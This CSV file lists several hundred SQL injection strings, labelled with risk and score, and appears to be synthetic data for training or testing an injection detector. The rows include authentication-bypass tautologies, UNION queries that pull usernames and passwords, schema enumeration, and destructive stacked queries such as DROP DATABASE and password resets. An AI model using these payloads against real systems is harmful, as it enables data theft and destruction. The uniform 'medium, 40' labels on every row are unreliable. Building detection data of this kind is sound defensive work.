query,risk,score
' or 1=1 in (select * from users) -- /**/,medium,40
'; DROP DATABASE temp -- -- n,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- /**/",medium,40
' or 1 = 1 LIMIT 1 -- -- x,medium,40
"' UNION SELECT username, password FROM users -- # ji",medium,40
' UNION SELECT * FROM information_schema.tables -- -- y,medium,40
1' OR '1' = '1' GROUP BY 1 -- /**/,medium,40
'; UPDATE users SET password='pass' /**/,medium,40
1' OR 1=1; SELECT * FROM users -- -- 5,medium,40
'; DROP DATABASE temp -- # vj,medium,40
'; UPDATE users SET password='pass' /**/,medium,40
1' OR 1=1; SELECT * FROM users -- # lu,medium,40
'; UPDATE users SET password='pass' -- 2,medium,40
' or 1=1 in (select * from users) -- -- x,medium,40
'; DROP DATABASE temp -- /**/,medium,40
'; SELECT COUNT(*) FROM users -- # la,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- /**/",medium,40
' or 1 = 1 LIMIT 1 -- -- 2,medium,40
' UNION SELECT * FROM information_schema.tables -- # q1,medium,40
'; SELECT @@version -- -- a,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- -- 0",medium,40
' or 1 = 1 LIMIT 1 -- # 86,medium,40
'; SELECT @@version -- /**/,medium,40
' HAVING 1=1 # -- s,medium,40
' HAVING 1=1 # # wc,medium,40
1' OR 1=1; SELECT * FROM users -- -- r,medium,40
' OR username LIKE '%admin%' -- -- a,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- /**/",medium,40
1' OR 1=1; SELECT * FROM users -- -- 1,medium,40
'; DROP DATABASE temp -- /**/,medium,40
'; SELECT @@version -- /**/,medium,40
' OR username LIKE '%admin%' -- # 4r,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- # 1m",medium,40
"' UNION ALL SELECT 1,2 FROM users -- -- l",medium,40
' or 1 = 1 LIMIT 1 -- /**/,medium,40
' OR username LIKE '%admin%' -- /**/,medium,40
'; UPDATE users SET password='pass' # m0,medium,40
' or 1 = 1 LIMIT 1 -- /**/,medium,40
'; UPDATE users SET password='pass' # 1m,medium,40
'; UPDATE users SET password='pass' # j2,medium,40
1' OR 1=1; SELECT * FROM users -- /**/,medium,40
' UNION SELECT * FROM information_schema.tables -- # l4,medium,40
1' OR 1=1; SELECT * FROM users -- /**/,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- -- 9",medium,40
"' OR '1'='1' UNION SELECT 1,2 -- # uf",medium,40
' OR username LIKE '%admin%' -- /**/,medium,40
' UNION SELECT * FROM information_schema.tables -- -- 2,medium,40
' HAVING 1=1 # -- n,medium,40
' HAVING 1=1 # -- o,medium,40
' OR username LIKE '%admin%' -- -- l,medium,40
' UNION SELECT * FROM information_schema.tables -- # r7,medium,40
"' UNION SELECT username, password FROM users -- # sx",medium,40
' or 1 = 1 LIMIT 1 -- /**/,medium,40
' HAVING 1=1 # /**/,medium,40
' HAVING 1=1 # -- r,medium,40
1' OR '1' = '1' GROUP BY 1 -- /**/,medium,40
1' OR '1' = '1' GROUP BY 1 -- # i1,medium,40
'; DROP DATABASE temp -- /**/,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- /**/",medium,40
' HAVING 1=1 # # 0n,medium,40
"' UNION ALL SELECT 1,2 FROM users -- -- o",medium,40
1' OR 1=1; SELECT * FROM users -- -- x,medium,40
' or 1=1 in (select * from users) -- # yt,medium,40
'; DROP DATABASE temp -- -- h,medium,40
1' OR 1=1; SELECT * FROM users -- # hx,medium,40
' or 1 = 1 LIMIT 1 -- -- t,medium,40
' or 1=1 in (select * from users) -- /**/,medium,40
1' OR '1' = '1' GROUP BY 1 -- -- 5,medium,40
"' UNION ALL SELECT 1,2 FROM users -- /**/",medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- /**/",medium,40
' or 1=1 in (select * from users) -- /**/,medium,40
'; SELECT COUNT(*) FROM users -- # d8,medium,40
"' UNION SELECT username, password FROM users -- /**/",medium,40
"' UNION SELECT username, password FROM users -- -- i",medium,40
'; UPDATE users SET password='pass' # k4,medium,40
' or 1=1 in (select * from users) -- # jk,medium,40
"' UNION SELECT username, password FROM users -- /**/",medium,40
' or 1=1 in (select * from users) -- -- p,medium,40
"' UNION ALL SELECT 1,2 FROM users -- -- d",medium,40
'; SELECT COUNT(*) FROM users -- # ks,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- /**/",medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- -- w",medium,40
' HAVING 1=1 # /**/,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- -- w",medium,40
'; SELECT COUNT(*) FROM users -- # sv,medium,40
'; DROP DATABASE temp -- -- s,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- /**/",medium,40
' UNION SELECT * FROM information_schema.tables -- # u6,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- /**/",medium,40
"' UNION SELECT username, password FROM users -- -- 2",medium,40
' or 1=1 in (select * from users) -- /**/,medium,40
"' UNION SELECT username, password FROM users -- # vh",medium,40
' HAVING 1=1 # # pb,medium,40
' HAVING 1=1 # # rj,medium,40
'; SELECT @@version -- -- g,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- # 2h",medium,40
1' OR 1=1; SELECT * FROM users -- -- t,medium,40
' OR username LIKE '%admin%' -- # w4,medium,40
' OR username LIKE '%admin%' -- -- 5,medium,40
' or 1 = 1 LIMIT 1 -- # 3l,medium,40
'; UPDATE users SET password='pass' -- 8,medium,40
' or 1=1 in (select * from users) -- /**/,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- -- q",medium,40
'; SELECT COUNT(*) FROM users -- /**/,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- -- v",medium,40
' UNION SELECT * FROM information_schema.tables -- # 1s,medium,40
' OR username LIKE '%admin%' -- -- o,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- /**/",medium,40
'; SELECT COUNT(*) FROM users -- -- 8,medium,40
' or 1=1 in (select * from users) -- -- w,medium,40
' HAVING 1=1 # /**/,medium,40
1' OR '1' = '1' GROUP BY 1 -- -- b,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- /**/",medium,40
'; SELECT @@version -- -- u,medium,40
1' OR '1' = '1' GROUP BY 1 -- -- 7,medium,40
' OR username LIKE '%admin%' -- /**/,medium,40
' or 1=1 in (select * from users) -- # 7d,medium,40
1' OR 1=1; SELECT * FROM users -- -- p,medium,40
"' UNION ALL SELECT 1,2 FROM users -- # dx",medium,40
'; SELECT @@version -- # lw,medium,40
'; SELECT COUNT(*) FROM users -- -- 7,medium,40
' HAVING 1=1 # -- r,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- /**/",medium,40
'; DROP DATABASE temp -- /**/,medium,40
' UNION SELECT * FROM information_schema.tables -- # al,medium,40
'; DROP DATABASE temp -- /**/,medium,40
'; UPDATE users SET password='pass' /**/,medium,40
' OR username LIKE '%admin%' -- -- u,medium,40
'; UPDATE users SET password='pass' /**/,medium,40
'; UPDATE users SET password='pass' /**/,medium,40
'; SELECT @@version -- -- j,medium,40
'; SELECT @@version -- -- x,medium,40
' HAVING 1=1 # /**/,medium,40
"' UNION SELECT username, password FROM users -- -- l",medium,40
' HAVING 1=1 # # 2j,medium,40
"' UNION ALL SELECT 1,2 FROM users -- -- 9",medium,40
' UNION SELECT * FROM information_schema.tables -- -- p,medium,40
'; DROP DATABASE temp -- /**/,medium,40
' OR username LIKE '%admin%' -- -- q,medium,40
1' OR '1' = '1' GROUP BY 1 -- -- 5,medium,40
' UNION SELECT * FROM information_schema.tables -- # pu,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- # pl",medium,40
' HAVING 1=1 # -- d,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- -- v",medium,40
' or 1=1 in (select * from users) -- /**/,medium,40
'; DROP DATABASE temp -- # m7,medium,40
' OR username LIKE '%admin%' -- # ry,medium,40
'; SELECT COUNT(*) FROM users -- -- 6,medium,40
'; SELECT @@version -- /**/,medium,40
' HAVING 1=1 # -- z,medium,40
'; SELECT COUNT(*) FROM users -- /**/,medium,40
'; DROP DATABASE temp -- -- g,medium,40
"' UNION SELECT username, password FROM users -- # zl",medium,40
' or 1=1 in (select * from users) -- -- n,medium,40
1' OR 1=1; SELECT * FROM users -- -- s,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- /**/",medium,40
"' OR '1'='1' UNION SELECT 1,2 -- # 0c",medium,40
"' UNION SELECT username, password FROM users -- /**/",medium,40
'; SELECT COUNT(*) FROM users -- -- o,medium,40
"' UNION ALL SELECT 1,2 FROM users -- -- h",medium,40
' or 1 = 1 LIMIT 1 -- /**/,medium,40
' UNION SELECT * FROM information_schema.tables -- -- i,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- # b1",medium,40
1' OR 1=1; SELECT * FROM users -- -- v,medium,40
"' UNION SELECT username, password FROM users -- /**/",medium,40
1' OR '1' = '1' GROUP BY 1 -- /**/,medium,40
"' UNION SELECT username, password FROM users -- -- 3",medium,40
"' UNION SELECT username, password FROM users -- # qk",medium,40
' or 1 = 1 LIMIT 1 -- # 4a,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- /**/",medium,40
' UNION SELECT * FROM information_schema.tables -- /**/,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- -- h",medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- # mp",medium,40
'; SELECT @@version -- # pt,medium,40
' HAVING 1=1 # # y5,medium,40
1' OR '1' = '1' GROUP BY 1 -- # tz,medium,40
' UNION SELECT * FROM information_schema.tables -- # vz,medium,40
' OR username LIKE '%admin%' -- # fw,medium,40
1' OR '1' = '1' GROUP BY 1 -- # y1,medium,40
' or 1 = 1 LIMIT 1 -- -- s,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- /**/",medium,40
'; UPDATE users SET password='pass' /**/,medium,40
'; SELECT @@version -- # 9c,medium,40
1' OR 1=1; SELECT * FROM users -- /**/,medium,40
' or 1=1 in (select * from users) -- /**/,medium,40
1' OR '1' = '1' GROUP BY 1 -- # bw,medium,40
"' UNION ALL SELECT 1,2 FROM users -- -- t",medium,40
' OR username LIKE '%admin%' -- -- t,medium,40
' or 1 = 1 LIMIT 1 -- /**/,medium,40
"' UNION ALL SELECT 1,2 FROM users -- -- c",medium,40
' or 1=1 in (select * from users) -- /**/,medium,40
' or 1 = 1 LIMIT 1 -- -- f,medium,40
'; SELECT COUNT(*) FROM users -- /**/,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- # 8p",medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- # 0y",medium,40
"' OR '1'='1' UNION SELECT 1,2 -- /**/",medium,40
'; DROP DATABASE temp -- /**/,medium,40
' or 1 = 1 LIMIT 1 -- -- w,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- /**/",medium,40
' UNION SELECT * FROM information_schema.tables -- # uu,medium,40
' or 1 = 1 LIMIT 1 -- -- 0,medium,40
"' UNION SELECT username, password FROM users -- /**/",medium,40
' or 1=1 in (select * from users) -- # tu,medium,40
'; UPDATE users SET password='pass' # uf,medium,40
'; DROP DATABASE temp -- -- f,medium,40
'; DROP DATABASE temp -- # zv,medium,40
' HAVING 1=1 # # i8,medium,40
1' OR '1' = '1' GROUP BY 1 -- -- p,medium,40
1' OR '1' = '1' GROUP BY 1 -- -- h,medium,40
' or 1 = 1 LIMIT 1 -- # jw,medium,40
1' OR '1' = '1' GROUP BY 1 -- # 9j,medium,40
'; SELECT COUNT(*) FROM users -- /**/,medium,40
"' UNION SELECT username, password FROM users -- /**/",medium,40
' or 1 = 1 LIMIT 1 -- -- y,medium,40
' or 1 = 1 LIMIT 1 -- -- j,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- -- b",medium,40
1' OR 1=1; SELECT * FROM users -- # wm,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- # 4g",medium,40
' HAVING 1=1 # -- v,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- # 7w",medium,40
' OR username LIKE '%admin%' -- # hg,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- # 30",medium,40
"' OR '1'='1' UNION SELECT 1,2 -- -- p",medium,40
' or 1=1 in (select * from users) -- # ik,medium,40
"' UNION SELECT username, password FROM users -- # 3w",medium,40
' HAVING 1=1 # # 1t,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- # zf",medium,40
1' OR 1=1; SELECT * FROM users -- /**/,medium,40
'; SELECT COUNT(*) FROM users -- -- 2,medium,40
1' OR 1=1; SELECT * FROM users -- # 3e,medium,40
"' UNION ALL SELECT 1,2 FROM users -- /**/",medium,40
' or 1 = 1 LIMIT 1 -- -- k,medium,40
' OR username LIKE '%admin%' -- # a0,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- # gs",medium,40
"' OR '1'='1' UNION SELECT 1,2 -- -- g",medium,40
1' OR 1=1; SELECT * FROM users -- /**/,medium,40
' or 1 = 1 LIMIT 1 -- # yd,medium,40
1' OR 1=1; SELECT * FROM users -- # r2,medium,40
'; SELECT COUNT(*) FROM users -- -- d,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- /**/",medium,40
' or 1 = 1 LIMIT 1 -- # kt,medium,40
1' OR '1' = '1' GROUP BY 1 -- # cb,medium,40
"' UNION SELECT username, password FROM users -- -- z",medium,40
"' UNION SELECT username, password FROM users -- /**/",medium,40
'; SELECT @@version -- /**/,medium,40
' or 1=1 in (select * from users) -- -- v,medium,40
' OR username LIKE '%admin%' -- -- 9,medium,40
' UNION SELECT * FROM information_schema.tables -- -- 7,medium,40
"' UNION SELECT username, password FROM users -- /**/",medium,40
' UNION SELECT * FROM information_schema.tables -- /**/,medium,40
'; SELECT COUNT(*) FROM users -- -- 3,medium,40
"' UNION SELECT username, password FROM users -- -- j",medium,40
"' OR '1'='1' UNION SELECT 1,2 -- -- l",medium,40
'; SELECT COUNT(*) FROM users -- -- 9,medium,40
' UNION SELECT * FROM information_schema.tables -- -- l,medium,40
'; UPDATE users SET password='pass' /**/,medium,40
' UNION SELECT * FROM information_schema.tables -- -- 7,medium,40
"' UNION ALL SELECT 1,2 FROM users -- -- m",medium,40
'; SELECT COUNT(*) FROM users -- -- c,medium,40
1' OR '1' = '1' GROUP BY 1 -- -- 3,medium,40
"' UNION ALL SELECT 1,2 FROM users -- /**/",medium,40
' UNION SELECT * FROM information_schema.tables -- -- z,medium,40
1' OR 1=1; SELECT * FROM users -- /**/,medium,40
' HAVING 1=1 # # 7d,medium,40
' or 1=1 in (select * from users) -- /**/,medium,40
'; SELECT @@version -- # y0,medium,40
1' OR '1' = '1' GROUP BY 1 -- /**/,medium,40
' or 1 = 1 LIMIT 1 -- # ft,medium,40
' UNION SELECT * FROM information_schema.tables -- /**/,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- # ee",medium,40
"' UNION ALL SELECT 1,2 FROM users -- /**/",medium,40
1' OR 1=1; SELECT * FROM users -- /**/,medium,40
'; DROP DATABASE temp -- /**/,medium,40
' HAVING 1=1 # /**/,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- # 03",medium,40
'; UPDATE users SET password='pass' /**/,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- -- s",medium,40
' OR username LIKE '%admin%' -- -- q,medium,40
' HAVING 1=1 # /**/,medium,40
' OR username LIKE '%admin%' -- # e4,medium,40
'; DROP DATABASE temp -- -- j,medium,40
'; UPDATE users SET password='pass' /**/,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- /**/",medium,40
' or 1 = 1 LIMIT 1 -- -- r,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- -- e",medium,40
' HAVING 1=1 # /**/,medium,40
' UNION SELECT * FROM information_schema.tables -- # ui,medium,40
"' UNION ALL SELECT 1,2 FROM users -- -- k",medium,40
"' UNION ALL SELECT 1,2 FROM users -- -- 8",medium,40
' or 1 = 1 LIMIT 1 -- -- 8,medium,40
'; UPDATE users SET password='pass' # 4q,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- /**/",medium,40
' or 1 = 1 LIMIT 1 -- /**/,medium,40
'; DROP DATABASE temp -- -- 7,medium,40
'; DROP DATABASE temp -- # ye,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- # dj",medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- # wk",medium,40
"' OR '1'='1' UNION SELECT 1,2 -- # sx",medium,40
' UNION SELECT * FROM information_schema.tables -- # kj,medium,40
' OR username LIKE '%admin%' -- /**/,medium,40
'; SELECT COUNT(*) FROM users -- # 3u,medium,40
'; SELECT @@version -- -- 1,medium,40
' or 1=1 in (select * from users) -- # ca,medium,40
"' UNION SELECT username, password FROM users -- # ft",medium,40
"' OR '1'='1' UNION SELECT 1,2 -- /**/",medium,40
' UNION SELECT * FROM information_schema.tables -- -- d,medium,40
'; SELECT @@version -- -- u,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- -- k",medium,40
1' OR 1=1; SELECT * FROM users -- -- z,medium,40
'; DROP DATABASE temp -- /**/,medium,40
' or 1=1 in (select * from users) -- -- x,medium,40
1' OR 1=1; SELECT * FROM users -- /**/,medium,40
1' OR '1' = '1' GROUP BY 1 -- -- e,medium,40
' UNION SELECT * FROM information_schema.tables -- -- r,medium,40
' OR username LIKE '%admin%' -- -- h,medium,40
'; SELECT @@version -- -- x,medium,40
1' OR '1' = '1' GROUP BY 1 -- # qq,medium,40
' OR username LIKE '%admin%' -- # wy,medium,40
1' OR 1=1; SELECT * FROM users -- # 4q,medium,40
' OR username LIKE '%admin%' -- /**/,medium,40
' HAVING 1=1 # -- v,medium,40
"' UNION SELECT username, password FROM users -- # vt",medium,40
' OR username LIKE '%admin%' -- # 8m,medium,40
'; DROP DATABASE temp -- # js,medium,40
"' UNION ALL SELECT 1,2 FROM users -- # zw",medium,40
' or 1 = 1 LIMIT 1 -- # k8,medium,40
"' UNION ALL SELECT 1,2 FROM users -- -- e",medium,40
' UNION SELECT * FROM information_schema.tables -- # am,medium,40
'; SELECT @@version -- # kb,medium,40
1' OR 1=1; SELECT * FROM users -- /**/,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- # nq",medium,40
' OR username LIKE '%admin%' -- -- o,medium,40
' or 1=1 in (select * from users) -- # p6,medium,40
' or 1 = 1 LIMIT 1 -- -- c,medium,40
'; SELECT COUNT(*) FROM users -- -- a,medium,40
1' OR 1=1; SELECT * FROM users -- /**/,medium,40
"' UNION SELECT username, password FROM users -- # pt",medium,40
"' OR '1'='1' UNION SELECT 1,2 -- -- 3",medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- /**/",medium,40
'; UPDATE users SET password='pass' -- z,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- -- j",medium,40
1' OR '1' = '1' GROUP BY 1 -- # 63,medium,40
' or 1=1 in (select * from users) -- # ol,medium,40
' OR username LIKE '%admin%' -- /**/,medium,40
' or 1=1 in (select * from users) -- /**/,medium,40
'; SELECT @@version -- /**/,medium,40
' OR username LIKE '%admin%' -- # m3,medium,40
'; SELECT @@version -- -- n,medium,40
' or 1 = 1 LIMIT 1 -- -- i,medium,40
' HAVING 1=1 # -- i,medium,40
'; SELECT @@version -- /**/,medium,40
'; UPDATE users SET password='pass' -- i,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- /**/",medium,40
' or 1=1 in (select * from users) -- -- z,medium,40
'; UPDATE users SET password='pass' -- s,medium,40
' UNION SELECT * FROM information_schema.tables -- /**/,medium,40
'; SELECT @@version -- # m3,medium,40
'; SELECT COUNT(*) FROM users -- # 50,medium,40
' OR username LIKE '%admin%' -- /**/,medium,40
"' UNION SELECT username, password FROM users -- -- t",medium,40
"' OR '1'='1' UNION SELECT 1,2 -- /**/",medium,40
' UNION SELECT * FROM information_schema.tables -- # xc,medium,40
"' UNION ALL SELECT 1,2 FROM users -- # bo",medium,40
1' OR '1' = '1' GROUP BY 1 -- /**/,medium,40
1' OR '1' = '1' GROUP BY 1 -- -- y,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- -- i",medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- -- e",medium,40
' or 1=1 in (select * from users) -- -- l,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- -- t",medium,40
'; DROP DATABASE temp -- /**/,medium,40
1' OR 1=1; SELECT * FROM users -- -- 8,medium,40
1' OR 1=1; SELECT * FROM users -- /**/,medium,40
' UNION SELECT * FROM information_schema.tables -- /**/,medium,40
"' UNION SELECT username, password FROM users -- # 9q",medium,40
1' OR '1' = '1' GROUP BY 1 -- -- t,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- -- i",medium,40
1' OR 1=1; SELECT * FROM users -- # lv,medium,40
1' OR 1=1; SELECT * FROM users -- /**/,medium,40
1' OR 1=1; SELECT * FROM users -- -- 1,medium,40
'; UPDATE users SET password='pass' # 10,medium,40
1' OR '1' = '1' GROUP BY 1 -- /**/,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- /**/",medium,40
"' UNION SELECT username, password FROM users -- -- w",medium,40
' or 1=1 in (select * from users) -- # we,medium,40
1' OR 1=1; SELECT * FROM users -- # 66,medium,40
' or 1 = 1 LIMIT 1 -- -- x,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- # 8l",medium,40
"' UNION ALL SELECT 1,2 FROM users -- -- p",medium,40
'; SELECT COUNT(*) FROM users -- -- x,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- /**/",medium,40
' or 1 = 1 LIMIT 1 -- /**/,medium,40
' OR username LIKE '%admin%' -- # ul,medium,40
' OR username LIKE '%admin%' -- -- f,medium,40
"' UNION ALL SELECT 1,2 FROM users -- /**/",medium,40
'; DROP DATABASE temp -- # fc,medium,40
"' UNION ALL SELECT 1,2 FROM users -- # v7",medium,40
' OR username LIKE '%admin%' -- -- r,medium,40
'; UPDATE users SET password='pass' /**/,medium,40
1' OR '1' = '1' GROUP BY 1 -- -- t,medium,40
'; SELECT @@version -- # a0,medium,40
'; SELECT @@version -- -- 0,medium,40
' HAVING 1=1 # /**/,medium,40
' or 1 = 1 LIMIT 1 -- /**/,medium,40
'; UPDATE users SET password='pass' /**/,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- # s9",medium,40
' HAVING 1=1 # # ps,medium,40
' HAVING 1=1 # -- u,medium,40
' OR username LIKE '%admin%' -- -- y,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- /**/",medium,40
'; SELECT COUNT(*) FROM users -- /**/,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- -- j",medium,40
' or 1=1 in (select * from users) -- /**/,medium,40
' or 1=1 in (select * from users) -- -- g,medium,40
' HAVING 1=1 # -- 6,medium,40
'; UPDATE users SET password='pass' -- p,medium,40
' UNION SELECT * FROM information_schema.tables -- -- c,medium,40
1' OR 1=1; SELECT * FROM users -- -- p,medium,40
